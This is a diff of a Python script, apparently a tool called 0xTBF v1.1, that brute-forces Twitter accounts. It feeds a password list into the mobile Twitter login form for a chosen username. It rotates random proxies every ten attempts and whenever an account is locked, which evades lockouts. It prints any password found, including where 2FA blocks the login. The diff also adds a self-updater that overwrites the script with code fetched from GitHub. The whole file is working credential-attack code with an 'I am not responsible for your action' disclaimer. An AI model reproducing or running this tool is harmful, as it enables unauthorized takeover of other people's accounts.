@@ -3,21 +3,23 @@
 
 import mechanize
 from proxylist import ProxyList
+import logging
 import sys, os, argparse
 
-print('''\033[1;32m
-             a8888a           M""""""""M M#"""""""'M  MM""""""""`M 
-            d8' ..8b          Mmmm  mmmM ##  mmmm. `M MM  mmmmmmmM 
-            88 .P 88 dP.  .dP MMMM  MMMM #'        .M M'      MMMM 
-            88 d' 88  `8bd8'  MMMM  MMMM M#  MMMb.'YM MM  MMMMMMMM 
-            Y8'' .8P  .d88b.  MMMM  MMMM M#  MMMM'  M MM  MMMMMMMM 
-             Y8888P  dP'  `dP MMMM  MMMM M#       .;M MM  MMMMMMMM 
-                              MMMMMMMMMM M#########M  MMMMMMMMMMMM 
-            ooooooooooooooooooooooooooooooooooooooooooooooooooooo
-            o [==] Coded By: Abdullah AlZahrani (0xAbdullah)    o
-            o [##] Twitter: @0xAbdullah | GitHub.com/0xAbdullah o
-            o [**] \033[1;m\033[1;41mI am not responsible for your action\033[1;m\033[1;32m         o
-            ooooooooooooooooooooooooooooooooooooooooooooooooooooo
+print('''\033[1;36m
+                               .:::::::::::.:: .::   .::::::::
+              .::                   .::    .:   .::  .::      
+            .::  .::  .::   .::     .::    .:    .:: .::      
+          .::     .::   .: .::      .::    .::: .:   .::::::  
+          .::      .::   .:         .::    .:    .:: .::      
+           .::    .::  .:  .::      .::    .:     .: .::      
+             .:::     .::   .::     .::    .:::: .:: .::      
+        ******************************************************
+        * > 0xTBF v1.1 Twitter brute-force                   *
+        * > Coded By: Abdullah AlZahrani (0xAbdullah)        *
+        * > Twitter: @0xAbdullah | GitHub.com/0xAbdullah     *
+        * > I am not responsible for your action             *
+        ******************************************************                                                    
 \033[1;m''')
 
 parser = argparse.ArgumentParser(description="[==] This simple script to penetrate accounts Twitter brute-force")
@@ -43,46 +45,67 @@ if os.path.exists(args['p']) == False:
     sys.exit("[!] password file does not exist !")
 elif os.path.exists(args['proxy']) == False:
     sys.exit("[!] proxy list file does not exist !")
-print("[@] Target Account: {}".format(username))
-def Proxy():
+
+def checkUpdate(): # Thanks xSecurity for your help | Follow him on Twitter: @xSecLabs
+    xBTF = os.path.basename(__file__)
+    print('[==] Checking For Update..')
+    check = b.open('https://raw.githubusercontent.com/0xAbdullah/0xTBF/master/version').read()
+    if '0xTBF_v1.1' not in check:
+        print('[$] There New Update | Wait...')
+        newUpdate = b.open('https://raw.githubusercontent.com/0xAbdullah/0xTBF/master/0xTBF.py').read()
+        update = file(xBTF, 'w')
+        update.write(newUpdate)
+        sys.exit('[==] Update Complete, Now Try To Execute Tool Again..')
+    else:
+        print('[==] There No Update, Start Brute Force Now...\n')
+
+def proxy():
+    logging.basicConfig()
+    pl = ProxyList()
+    pl.load_file(proxyList)
+    pl.random()
+    getProxy = pl.random().address()
+    b.set_proxies(proxies={"https": getProxy})
     try:
-        pl = ProxyList()
-        pl.load_file(proxyList)
-        pl.random()
-        proxy = pl.random().address()
-        b.set_proxies(proxies={"https": proxy})
-        ProxtIP = b.open("https://api.ipify.org/?format=raw", timeout=3)
+        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=2)
     except:
-        Proxy()
+        return proxy()
 
 def Twitter():
     password = open(passwordList).read().splitlines()
+    try_login = 0
+    print("[==] Target Account: {}".format(username))
     for password in password:
-        sys.stdout.write('\r[!] {} '.format(password))
+        try_login += 1
+        if try_login == 10:
+            try_login = 0
+            proxy()
+        sys.stdout.write('\r[==] {} '.format(password))
         sys.stdout.flush()
         url = "https://mobile.twitter.com/login"
         try:
-            response = b.open(url, timeout=10)
+            response = b.open(url, timeout=5)
             b.select_form(nr=0)
             b.form['session[username_or_email]'] = username
             b.form['session[password]'] = password
             b.method = "POST"
             response = b.submit()
             if 'https://mobile.twitter.com/account/login_challenge' in response.geturl():
-                print("\n[!] Password Found: {} --> But There is a 2FA".format(password))
+                print("[^] True\n[==] Password Found: {} --> But There is a 2FA".format(password))
                 break
             elif response.geturl() == "https://mobile.twitter.com/home":
-                print("[^] Password Found {}".format(password))
+                print("[^] True\n[==] Password Found {}".format(password))
                 break
             elif 'https://mobile.twitter.com/account/locked' in response.geturl():
-                Proxy()
+                proxy()
             else:
                 sys.stdout.write("[!] False\n")
         except:
-            sys.stdout.write('[-] something wrong\n')
+            sys.stdout.write('[!] something wrong\n')
             sys.stdout.flush()
-            Proxy()
+            proxy()
 
 if __name__ == '__main__':
-    Proxy()
+    checkUpdate()
+    proxy()
     Twitter()
